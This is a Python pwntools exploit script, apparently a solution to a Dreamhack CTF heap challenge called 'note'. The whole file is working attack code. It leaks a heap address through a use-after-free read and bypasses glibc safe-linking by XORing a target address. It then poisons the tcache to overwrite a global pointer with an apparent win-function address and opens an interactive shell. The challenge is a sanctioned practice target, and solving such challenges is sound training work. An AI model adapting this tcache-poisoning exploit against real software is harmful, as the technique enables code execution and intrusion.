#!/usr/bin/env python3
from pwn import *

PORT = 9428
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./note_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b*0x00000000004015C8
            b*0x000000000040131D
            b*0x00000000004014DA
            b*0x000000000040140C
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(i): sla(b'> ', str(i).encode())

def create(i, sz, dt):
    menu(1)
    sla(b'idx: ', str(i).encode())
    sla(b'size: ', str(sz).encode())
    sa(b'data: ', dt)

def read(i):
    menu(2)
    sla(b'idx: ', str(i).encode())   

def update(i, dt):
    menu(3)
    sla(b'idx: ', str(i).encode())
    sa(b'data: ', dt)

def delete(i):
    menu(4)
    sla(b'idx: ', str(i).encode())   

# Leak libc

for i in range(2, 9):
    create(i, 0x18, b'X'*8)
for i in range(2, 9):
    delete(i)

create(0, 0x21, b'A'*8)
create(1, 0x18, b'B'*8)

# GDB()
delete(1)
read(1)

p.recvuntil(b'data: ')
heap = u64(p.recvline().strip().ljust(8, b'\x00')) << 12
log.info(f'heap :{hex(heap)}')

update(1, p64((heap >> 12) ^ (0x4040a0)))
# GDB()
create(1, 0x18, b'AAA')

create(9, 0x18, p64(0x404060))

update(0, p64(0x401256))

menu(1)
sla(b'idx: ', str(36).encode())
p.interactive()